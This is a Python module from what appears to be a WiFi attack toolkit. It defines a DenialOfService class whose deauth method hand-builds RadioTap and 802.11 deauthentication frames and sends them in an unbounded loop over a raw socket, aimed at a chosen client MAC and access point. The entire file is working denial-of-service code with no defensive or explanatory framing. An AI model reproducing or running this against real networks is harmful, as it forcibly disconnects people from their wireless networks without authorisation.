#!/usr/bin/python3

"""This module contains multiple denial of service attacks."""
from .interface_manager import InterfaceManager
from binascii import unhexlify
import socket
import time
import struct


class DenialOfService():
    """Denial of service attacks."""

    def __init__(self, target_addr, access_point, interface, channel):
        """Initialize variables."""
        self.target_addr = target_addr
        self.access_point = access_point
        self.interface = interface
        self.manager = InterfaceManager(interface)
        self.manager.wlan_channel(channel)
        self.sending = False
        self.running = False

    def deauth(self):
        """Perform a deauthentication attack."""
        # https://man7.org/linux/man-pages/man7/packet.7.html
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((self.interface, 0))

        # The RadioTap version is always 0
        rt_version = 0
        # The padding is always 0
        rt_padding = 0
        # The empty RadioTap frame has length of 8 bytes
        rt_length = 8
        # The RadioTap flags are irrelevant
        rt_flags = 0   
        # Construct the empty RadioTap frame (1,1,2,4 bytes)
        # https://docs.python.org/3/library/struct.html
        rt_frame = struct.pack(
            'BBHI',
            rt_version,
            rt_padding,
            rt_length,
            rt_flags
            )

        # The 802.11 de-authentication subtype(4bits), type(2bits), version(2bits)
        dot11_type = int(b'11000000', 2)
        # The 802.11 flags are irrelevant
        dot11_flags = 0 
        # The 802.11 duration is irrelevant
        dot11_dur = 0
        # The 802.11 receiver address
        dot11_ra = bytes(map(lambda x: int(x, 16) , self.target_addr.split(':')))
        # The 802.11 transmitter address
        dot11_ta = bytes(map(lambda x: int(x, 16) , self.access_point.split(':')))
        # The 802.11 access point address
        dot11_ap = dot11_ta
        # The 802.11 sequence control is irrelevant
        dot11_sc = 0
        # The 802.11 reason code is irrelevant (0 is fine)
        dot11_reason = 0
        # Construct the 802.11 frame (1,1,2,6,6,6,2,2 bytes)
        # https://docs.python.org/3/library/struct.html
        dot11_frame = struct.pack(
            'BBH6s6s6sHH',
            dot11_type,
            dot11_flags,
            dot11_dur,
            dot11_ra,
            dot11_ta,
            dot11_ap,
            dot11_sc,
            dot11_reason
        )

        # Construct the full payload (RadioTap + 802.11)
        payload = rt_frame + dot11_frame 

        # Send packets while running and sending
        while 1:
            while self.sending:
                s.send(payload)
            time.sleep(1)

    def start_sending(self, _):
        """Start sending deauthentication packets."""
        self.sending = True
        print(f'[INFO] Sending DEAUTH packets to {self.target_addr} on AP {self.access_point}')

    def stop_sending(self, _):
        """Stop sending deauthentication packets."""
        self.sending = False
        print(f'[INFO] Done sending DEAUTH packets to {self.target_addr} on AP {self.access_point}')
